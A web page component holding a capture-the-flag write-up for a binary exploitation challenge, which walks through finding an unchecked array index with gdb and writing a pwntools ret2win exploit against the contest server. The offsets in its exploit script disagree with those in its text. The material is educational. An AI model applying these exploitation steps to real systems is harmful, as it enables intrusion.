import Tag from "@/components/Common/Tag";
import { mdxComponents } from "@/components/ui/mdxComponents";
import FlagSubmissionBox from "@/components/Blog/CTF/FlagSubmissionBox";
import { createFileRoute } from "@tanstack/react-router";
import Markdown from "react-markdown";
import rehypeRaw from "rehype-raw";

const title = "# [pwn] Permutations";
const stars = "☆☆☆☆";
const author = "F21endSh1p"
const points = 493;
const solves = 15;
const category = "Binary Exploitation";
const competition = "CUHK CTF 2025";

const question = `
Move around and find out.

*Tutorial guide in challenge files*

\`\`\`
FROM ubuntu@sha256:9cbed754112939e914291337b5e554b07ad7c392491dba6daf25eef1332a22e8
\`\`\`

\`nc chall.25.cuhkctf.org 25067\`

[source](/assets/images/blog/cuhk25ctf/permutations/67_permutations_dcf1ea8df9a78ec32bdbd6c66e68fcf9.zip)
`

const writeup = `
# Solution:
Inside the folder, there is a very lengthy \`guide.md\` file, a binary \`chall\`, the source code \`chall.c\` and a \`build.sh\`.

Checking the \`chall.c\`, we see a \`win\` function that reads the flag from \`flag.txt\` and prints it out.

\`\`\`c
void win() {
    puts("You got the hidden prize!");
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        puts("Something went wrong, please open a ticket.");
        exit(1);
    }
    char s[256];
    fgets(s, sizeof(s), f);
    puts(s);
    fclose(f);
}
\`\`\`

However, there is no calls to this function anywhere in the code.

**This hints to us that we need to perform a [ret2win](https://ir0nstone.gitbook.io/notes/binexp/stack/ret2win) attack to get the flag.**

---


## Step 0: What is ret2win?

In simpler terms, \`ret2win\` is a technique where we overwrite the return address of a function, causing the program to \`jmp\` to our desired function address. In this case, the \`win\` function. 

### How return addresses work:

The \`Stack\` is a region of memory which is LIFO *(Last-In-First-Out)*. We store local variables and function call information there as blocks of memories.

When a function is called, a new block is created on the stack. We first push the **return address** onto the stack, then followed by the function's **local variables**.

![Stack Diagram from Wikipedia](https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/Call_stack_layout.svg/1024px-Call_stack_layout.svg.png)

This procedure can nest, meaning that if a function (e.g. \`DrawSquare\`) calls **another function** (e.g. \`DrawLine\`), a new block is created on top of the previous one.

When a function ends, the block is popped off the stack, and the return address is retrieved to jump back to the caller function.

This means if the stack is corrupted, the return address can be changed to another address, *for example, the win function address*.

## Step 1. Finding the vulnerability

Looking through the code, we see there is a \`fruits\` array that stores 26 fruits.

\`\`\`c
const char* fruits[] = {
    "Apple",      // A
    "Banana",     // B
    "Cherry",     // C
    ... (etc) ...
    "Yellow Passion Fruit", // Y
    "Zucchini"    // Z
};
...

scanf("%31s", cmd);
if (strcmp(cmd, "swap") == 0) {
    int idx_a, idx_b;
    scanf("%d%d", &idx_a, &idx_b);
    const char *t = fruits[idx_a];
    fruits[idx_a] = fruits[idx_b];
    fruits[idx_b] = t;
    printf("Swapped %s with %s\\n", fruits[idx_b], fruits[idx_a]);
} else if (strcmp(cmd, "show") == 0) {
...
\`\`\`

Down below, there is a scanf which takes a 31-character string, and compares it with \`"swap"\`.

If it matches, it takes in two integers, and swaps the fruits at those indices. However, there is **no bounds checking** on the indices.

![Array Space from Study.com](/assets/images/blog/cuhk25ctf/permutations/array_space.png)

As shown here, the array starts at index 0, and spans **towards** where the return address is stored.

This means if we input a large enough index, we can read or even overwrite the return address of the function!


## Step 2. Launching GDB Debugger and analysing the binary

To speed up the process, lets use \`gdb\` with \`gef\` plugin.

Installation: \`sudo apt-get update; sudo apt-get install gdb; bash -c "$(curl -fsSL https://gef.blah.cat/sh)"\` [GEF-GitHub](https://github.com/hugsy/gef)

Running \`gdb ./chall\`, we do \`checksec\` to see the security features.
\`\`\`txt
gef➤  checksec
[+] checksec for '/mnt/c/codes/ctf/cuhk-ctf-2025/pwn/permutations/public/chall'
Canary                        : ✓ 
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Full
\`\`\`
As we can see, the binary has \`NX\` and \`PIE\` enabled, which means we cannot execute code on the stack, and the binary is loaded at a random address.

Usually, I would like to find where \`scanf\` is called, so I can set a breakpoint there. I'll filter where the address is inside of the main function.

\`\`\`md
gef➤  disassemble main
Dump of assembler code for function main:
...
0x00000000000015e7 <+606>:   mov    eax,0x0
0x00000000000015ec <+611>:   call   0x1170 <__isoc23_scanf@plt>
0x00000000000015f1 <+616>:   lea    rax,[rbp-0x30]
0x00000000000015f5 <+620>:   lea    rdx,[rip+0xcd6]        # 0x22d2
...
0x000000000000162a <+673>:   mov    eax,0x0
0x000000000000162f <+678>:   call   0x1170 <__isoc23_scanf@plt>
0x0000000000001634 <+683>:   mov    eax,DWORD PTR [rbp-0x118]
0x000000000000163a <+689>:   cdqe
...
\`\`\`

I realized that the two scanf calls are at \`0x15ec\` and \`0x162f\`. I'll set a breakpoint at \`0x15e7\` \`0x162a\` so I can see the stack before the call.

Note that we should be using \`pie break 0x162a\` and \`pie run\` instead of \`break *0x162a\` and \`run\` because PIE is enabled.

\`\`\`md
gef➤  pie break 0x15e7
gef➤  pie break 0x162a
gef➤  pie run
\`\`\`

## Step 3. Finding the offset of the return address from the buffer
### Step 3.1 _start address

To look for where \`_start\` is located, we can do 
\`\`\`md
gef➤  info function _start
All functions matching regular expression "_start":
...
Non-debugging symbols:
0x00005555555551e0  _start

gef➤  search-pattern 0x00005555555551e0
All functions matching regular expression "0x00005555555551e0":
[+] Searching '\xe0\x51\x55\x55\x55\x55\x00\x00' in memory
[+] In '/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'(0x7ffff7ffd000-0x7ffff7fff000), permission=rw-
  0x7ffff7ffe5c8 - 0x7ffff7ffe5e8  →   "\xe0\x51\x55\x55\x55\x55\x00\x00[...]"
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffdf30 - 0x7fffffffdf50  →   "\xe0\x51\x55\x55\x55\x55\x00\x00[...]"
  0x7fffffffe128 - 0x7fffffffe148  →   "\xe0\x51\x55\x55\x55\x55\x00\x00[...]"

gef➤  search-pattern 0x7fffffffdf30
[+] Searching '\x30\xdf\xff\xff\xff\x7f' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw- 
0x7fffffffde40 - 0x7fffffffde58  →   "\x30\xdf\xff\xff\xff\x7f[...]"
\`\`\`

### Step 3.2 fruits address

To find where the \`fruits\` array is located, we can search for one of the fruit strings, for example, "Apple".

\`\`\`md
gef➤  search-pattern Apple
[+] Searching 'Apple' in memory
[+] In '/mnt/c/codes/ctf/cuhk-ctf-2025/pwn/permutations/public/chall'(0x555555556000-0x555555557000), permission=r-- 
  0x55555555605c - 0x555555556061  →   "Apple"
[+] In '/mnt/c/codes/ctf/cuhk-ctf-2025/pwn/permutations/public/chall'(0x555555557000-0x555555558000), permission=r-- 
  0x55555555705c - 0x555555557061  →   "Apple"

gef➤  search-pattern 0x55555555605c
[+] Searching '\x5c\x60\x55\x55\x55\x55' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffdd50 - 0x7fffffffdd56  →   "\`UUUU"
\`\`\`

From the above three searches, we see that the \`_start\` function is at \`0x7fffffffde40\` -> \`0x7fffffffdf30\`, and the \`fruits\` array starts at \`0x7fffffffdd50\`.

We can calculate the offset of the return address from the start of the \`fruits\` array.

### Step 3.3 Finding the offset

To see the stack layout, we can do \`x/80gx 0x7fffffffdd50\` to read the array.

\`\`\`md
gef➤  x/80gx 0x7fffffffdd50
0x7fffffffdd50: 0x000055555555605c (Apple)      0x0000555555556062 (Banana)
0x7fffffffdd60: 0x0000555555556069 (Cherry)      0x0000555555556070 (Date)  
...
0x7fffffffde00: 0x000055555555610a      0x0000555555556115      
0x7fffffffde10: 0x000055555555611b (Yellow Passion Fruit)      0x0000555555556130 (Zucchini)
0x7fffffffde20: 0x0000000000000000      0x0000000000000000      
0x7fffffffde30: 0x0000000000000000      0x00007ffff7fe5af0      
0x7fffffffde40: 0x00007fffffffdf30 <*>points to 0x7fffffffdf30, which is pointing to 0x00005555555551e0</*>      0xe917ca99f246e100      
0x7fffffffde50: 0x00007fffffffdef0      0x00007ffff7dce1ca      
...
\`\`\`

If we count the number of words from the start of the array (\`0x7fffffffdd50\`) to the return address (\`0x7fffffffde40\`), we get **30**.

This means if we input an index of 30, we will be swapping to the return address.

To verify this, we can try swapping index 0 and 30, and observing the stack.

\`\`\`md
gef➤  continue
swap
gef➤  continue
0 30

gef➤  x/80gx 0x7fffffffdd50
0x7fffffffdd50: 0x00007fffffffdf30 <*>the pointer to _start moved here :O</*>      0x0000555555556062 (Banana)
...
0x7fffffffde00: 0x000055555555610a      0x0000555555556115
0x7fffffffde10: 0x000055555555611b      0x0000555555556130
0x7fffffffde20: 0x0000000070617773 <*>notice this changed, this would be important in the next step</*>      0x0000000000000000
0x7fffffffde30: 0x0000000000000000      0x00007ffff7fe5af0
0x7fffffffde40: 0x000055555555605c <*>the original end pointer turned to Apple</*>      0xe917ca99f246e100
...
\`\`\`

As we can see, the pointer to \`_start\` has moved to \`fruits[0]\`, and the pointer to \`"Apple"\` has moved to where the pointer to \`_start\` was.

When we continue the program and use the \`show\` command, we can get the actual address of the \`_start\` function.
(We could not directly use the \`win\` function address because PIE is enabled, and it is randomized every time.)

## Step 4. Changing the return address to the win function

Let's see if we can find any stored address of the \`win\` function in the stack.

\`\`\`md
gef➤  info function win
All functions matching regular expression "win":
Non-debugging symbols:
0x00005555555552c9  win()

gef➤  search-pattern 0x00005555555552c9
[+] Searching '\xc9\x52\x55\x55\x55\x55\x00\x00' in memory
\`\`\`

Unfortunately, a pointer to \`win\` is not stored anywhere in the stack.

This means we need to somehow add the address into the stack.

This usually implies we need to input it as a string through \`scanf\`.

Let's try inputting a string of "ABCDEFGHIJKLMNOPQRSTUVWXYZ" to see what happens to the array.

\`\`\`md
gef➤  continue
ABCDEFGHIJKLMNOPQRSTUVWXYZ
...

0x7fffffffdd50: 0x00007fffffffdf30      0x0000555555556062 (Banana)
...
0x7fffffffde10: 0x000055555555611b      0x0000555555556130 (Zucchini)
0x7fffffffde20: 0x4847464544434241      0x504f4e4d4c4b4a49 <*>Check here</*>
0x7fffffffde30: 0x5857565554535251      0x00007ffff7005a59
0x7fffffffde40: 0x0000555555556069      0xe917ca99f246e100
...
\`\`\`

As we can see, the string is stored in the stack starting from \`0x7fffffffde20\`.
Interestingly, the string is stored in **reverse order**, which means it uses **little-endian** format.

This means if we want to store the address of \`win\` in the stack, we need to input it in reverse order.

Before that, we still need to know what would happen when we overwrite this string with something like \`"swap"\`

Let's try that!

\`\`\`md
gef➤  continue
swap
gef➤  x/80gx 0x7fffffffdd50
...
0x7fffffffde20: 0x48474600776f6873      0x504f4e4d4c4b4a49
0x7fffffffde30: 0x5857565554535251      0x00007ffff7005a59
0x7fffffffde40: 0x0000555555556069      0xe917ca99f246e100
...
\`\`\`

Hmm, the string is now changed to \`0x48474600776f6873\`, which is \`HGF\\x00paws\` in ASCII.

The \`\\x00\` is a null byte, which terminates the string. However, the rest of the string is still intact.

This means if we want to input the address of \`win\`, we need to pad it with any characters until it reaches 8 bytes, then insert the address in little-endian format.

\`\`\`py
from pwn import *

win_address = ... # Put the win address here

payload = "A" * 8
payload += p64(win_address)
\`\`\`

## Step 5. Finding the win function address

Now we can calculate the address of the \`win\` function by finding the offset between \`_start\` and \`win\` in the binary.
\`\`\`txt
gef➤  info function win
All functions matching regular expression "win":
...
Non-debugging symbols:
0x00005555555552c9  win()
\`\`\`

The offset is \`0x52c9 - 0x51e0 = 0xe9\`.

Now we can add \`0xe9\` to the \`received\` address to get the \`win\` address.


We can use \`pwntools\` from Python to craft the payload.

\`\`\`py
from pwn import *

# io = process('./chall') # for local testing
io = remote('chall.25.cuhkctf.org', 25067)

context.arch = 'amd64'
context.log_level = 'debug'

# pie
e = context.binary = ELF('./chall')

#GDB
# gdb.attach(io, '''pie break 0x1806''')

log.info("Step 1: Leak executable address using index 30 (as suggested in guide)")
io.recvuntil(b'>')
io.sendlineafter(b'> ', b'swap 30 0')
leak_line = io.recvuntil(b'>')
log.info(f"Leak response: {leak_line}")

# Extract leaked address
# The guide shows the leak should contain executable data
leaked_data = leak_line.split(b'Swapped ')[1].split(b' with')[0]
log.info(f"Leaked data: {leaked_data}")

# Convert to address (handle the string format)
# Since it's printed as a string, we need to extract the actual bytes
leaked_addr = unpack(leaked_data.ljust(8, b'\x00'), word_size=64)
log.success(f"Leaked address: {hex(leaked_addr)}")

# Calculate win address (you need to find this offset by analyzing the binary)
# Use: objdump -d chall | grep -A5 "win>:"
# Or: nm chall | grep win
base_addr = leaked_addr - 0x11e0  # From guide: offset to _start
win_addr = base_addr + 0x12c9     # Offset to win function (needs verification)

context.binary.address = base_addr

print(e.got['putchar'])

log.success(f"Base address: {hex(base_addr)}")
log.success(f"Win address: {hex(win_addr)}")

payload = b'UUUUUUUU' + p64(win_addr)
payload = payload.strip(b'\\x00')

io.sendline(payload)
io.recvuntil(b'> ')
io.sendline(b'swap 27 0') # swap 27 with 0 to put converted address

io.recvuntil(b'> ')

io.sendline(b'swap 33 0') # swap 33 with 0 to swap to return address
io.sendline(b'finish') 
result = io.recvall()

if b"hidden" in result:
    print(f"Found!")
    print(result)
\`\`\`

\`\`\`
Output:
cuhk25ctf{u-Sti11-L3aRN-tHe-BaSic-PwN-Fu-0f-CalCulATInG-AddreSs____JuSt-ThAT-IT-doEs-Not-reAllY-HaVE-MuCh-T0-dO-With-MATHS}
\`\`\`

`

export const Route = createFileRoute("/blog/ctf/cuhk25ctf/permutations")({
  component: permutations,
})

function permutations() {
  return (
    <div className="w-full mx-auto my-8 px-4 flex justify-center">
      <div className="w-full sm:w-[70%] md:w-[50%]">
        <div className="border-2 border-gray-400 p-4 rounded-md mb-16">
          <Markdown components={mdxComponents}>{title}</Markdown>
          <div className="text-gray-0 my-4">
            <p>Author: {author}</p>
            <p>{stars}</p>
            <p>{points} Points | {solves} Solves</p>
          </div>
          <div className="flex gap-2 my-4">
            <Tag>{category}</Tag>
            <Tag>{competition}</Tag>
          </div>
          <Markdown rehypePlugins={[rehypeRaw]} components={mdxComponents}>{question}</Markdown>
          <FlagSubmissionBox flag="cuhk25ctf{p3rmUt4t10n5_4r3_4m4z1ng}" />
        </div>
        <Markdown rehypePlugins={[rehypeRaw]} components={mdxComponents}>{writeup}</Markdown>
      </div>
    </div>
  )
}
